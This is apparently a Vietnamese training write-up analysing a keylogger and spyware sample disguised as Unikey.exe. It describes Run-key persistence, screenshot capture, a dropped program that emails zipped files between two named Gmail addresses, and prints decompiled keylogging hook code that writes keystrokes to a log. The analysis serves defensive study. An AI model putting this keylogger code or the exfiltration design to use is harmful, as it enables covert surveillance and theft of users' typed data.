# Tạo folder và đổi tên

- Mã độc sẽ tạo ra thư mục `Explorer` cùng vị trí với file `explorer.exe`

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/1.png'>

- Mã độc sẽ tạo ra file `Unikey.exe` trong thư mục `Explorer` và copy lại chính nó vào file đó

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/2.png'>

- Sau 2 bước này mã độc sẽ có tên là `Unikey.exe` và được lưu trong đường dẫn `Explorer`.

# Persistent

- Mã độc sẽ tạo thêm giá trị trong `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` để chạy mỗi khi máy tính nạn nhân khởi động

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/3.png'>

# Tạo ra file Tranfer.exe từ resource

- Mã độc tạo ra một file `Tranfer.exe` rỗng sau đó copy toàn bộ từ file resource có tên chữa chuỗi `exe` của mã độc vào file vừa tạo.

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/4.png'>

- Phân tích file Tranfer.exe

  - File thực thi này viết bằng C# có chức năng nén các file lại và gửi từ gmail `anhthc95@gmail.com` đến gmail `hunganh1803@gmail.com`.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/5.png'>

# Lấy thông tin về vi xử lý 

- Mã độc sẽ truy vấn key `HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0` giá trị `ProcessorNameString` rồi ghi vào file `Systeminfo.txt`.

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/6.png'>

# Tạo luồng để thực thi hàm

- Mã độc sẽ tạo một luồng để thực thi hàm:

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/7.png'>

  
  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/11.png'>

- Phân tích hàm `sub_401320`:

  - Mã độc sẽ tạo ra file `Keylog.dll` bằng cách tạo file rỗng có tên như vậy và copy data từ resource có tên chứa chuỗi dll vào file rỗng đó.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/12.png'>

  - Tiếp theo mã độc sẽ tạo ra một Handle để dùng `Keylog.dll`.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/13.png'>  

  - Tiếp theo, mã độc sẽ thực thi hàm `FillKeyboard` của dll bằng hàm `SetWindowsHookExW` với idHook là 2, mỗi khi có sự kiện bàn phím xảy ra hàm này sẽ được thực thi.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/8.png'>

  - Sau đó. mã độc sẽ thực thi hàm `SetGlobalHookHandle`
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/9.png'>

- Phân tích hàm `FillKeyboard`

  - Hàm này tạo ra file `Log.txt` và ghi tên cửa sổ đang được dùng, dữ liệu thời gian, các phím được ấn xuống vào đó.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/15.png'>

    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/16.png'>

    ```
            switch ( wParam )
        {
          case 1u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "LBUTTON";
              goto LABEL_101;
            }
            break;
          case 2u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "RBUTTON";
              goto LABEL_101;
            }
            break;
          case 3u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "CANCEL";
              goto LABEL_101;
            }
            break;
          case 4u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "MBUTTON";
              goto LABEL_101;
            }
            break;
          case 8u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "BACKSPACE";
              goto LABEL_101;
            }
            break;
          case 9u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "TAB";
              goto LABEL_101;
            }
            break;
          case 0xCu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "5 no NUMLOCK";
              goto LABEL_101;
            }
            break;
          case 0xDu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[%s]\n", "ENTER");
              goto LABEL_102;
            }
            break;
          case 0x10u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "SHIFT";
              goto LABEL_101;
            }
            break;
          case 0x11u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "CTRL";
              goto LABEL_101;
            }
            break;
          case 0x12u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "ALT";
              goto LABEL_101;
            }
            break;
          case 0x13u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "PAUSE";
              goto LABEL_101;
            }
            break;
          case 0x14u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "CapLock";
              goto LABEL_101;
            }
            break;
          case 0x1Bu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "ESC";
              goto LABEL_101;
            }
            break;
          case 0x20u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "SPACE";
              goto LABEL_101;
            }
            break;
          case 0x21u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "Page Up";
              goto LABEL_101;
            }
            break;
          case 0x22u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "Page Down";
              goto LABEL_101;
            }
            break;
          case 0x23u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "END";
              goto LABEL_101;
            }
            break;
          case 0x24u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "HOME";
              goto LABEL_101;
            }
            break;
          case 0x25u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "LEFT";
              goto LABEL_101;
            }
            break;
          case 0x26u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "UP";
              goto LABEL_101;
            }
            break;
          case 0x27u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "RIGHT";
              goto LABEL_101;
            }
            break;
          case 0x28u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "DOWN";
              goto LABEL_101;
            }
            break;
          case 0x2Cu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "Print Screen";
              goto LABEL_101;
            }
            break;
          case 0x2Du:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "Insert";
              goto LABEL_101;
            }
            break;
          case 0x2Eu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "Delete";
              goto LABEL_101;
            }
            break;
          case 0x6Au:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "*");
              goto LABEL_64;
            }
            break;
          case 0x6Bu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "+");
              goto LABEL_64;
            }
            break;
          case 0x6Du:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "-");
              goto LABEL_64;
            }
            break;
          case 0x6Eu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, ".");
              goto LABEL_64;
            }
            break;
          case 0x6Fu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "/");
              goto LABEL_64;
            }
            break;
          case 0x70u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F1]");
              goto LABEL_64;
            }
            break;
          case 0x71u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F2]");
              goto LABEL_64;
            }
            break;
          case 0x72u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F3]");
              goto LABEL_64;
            }
            break;
          case 0x73u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F4]");
              goto LABEL_64;
            }
            break;
          case 0x74u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F5]");
              goto LABEL_64;
            }
            break;
          case 0x75u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F6]");
              goto LABEL_64;
            }
            break;
          case 0x76u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F7]");
              goto LABEL_64;
            }
            break;
          case 0x77u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F8]");
              goto LABEL_64;
            }
            break;
          case 0x78u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F9]");
              goto LABEL_64;
            }
            break;
          case 0x79u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F10]");
              goto LABEL_64;
            }
            break;
          case 0x7Au:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F11]");
              goto LABEL_64;
            }
            break;
          case 0x7Bu:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              fprintf(Stream, "[F12]");
    LABEL_64:
              fclose(Stream);
            }
            break;
          case 0x90u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "NumLock";
              goto LABEL_101;
            }
            break;
          case 0x91u:
            if ( !fopen_s(&Stream, pszPath, "a+") )
            {
              v6 = "ScrollLock";
    LABEL_101:
              fprintf(Stream, "[%s]", v6);
    LABEL_102:
              fclose(Stream);
            }
            break;
          default:
            break;
        }
        if ( wParam - 48 <= 9 && !fopen_s(&Stream, pszPath, "a+") )
        {
          fprintf(Stream, "%d", wParam - 48);
          fclose(Stream);
        }
        if ( wParam - 65 <= 0x19 && !fopen_s(&Stream, pszPath, "a+") )
        {
          fprintf(Stream, "%c", wParam);
          fclose(Stream);
        }
        if ( wParam - 96 <= 9 && !fopen_s(&Stream, pszPath, "a+") )
        {
          fprintf(Stream, "[%d with NUMLOCK]", wParam - 96);
          fclose(Stream);
        }
        v4 = lParam;
      }
      return CallNextHookEx(hhk, nCode, wParam, v4);
    ```
 
  - Sau đó, hàm này sẽ gọi hàm `CallNextHookEx` để tiếp tục quá trình hook.
 
- Phân tích hàm `SetGlobalHookHandle`

  - Hàm này là hàm kiểm tra trạng thái hook của mã độc.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/17.png'>
 
# Vòng lặp

- Mã độc sẽ chụp ảnh màn hình và lưu vào file `screen.jpeg`.

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/10.png'>

- Sau đó, mã độc sẽ thực thi file `Tranfer.exe`.

- Cuối cùng, mã độc sẽ dừng 60s rồi tiếp tục vòng lặp.

  <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2014/File%20PNG/14.png'>
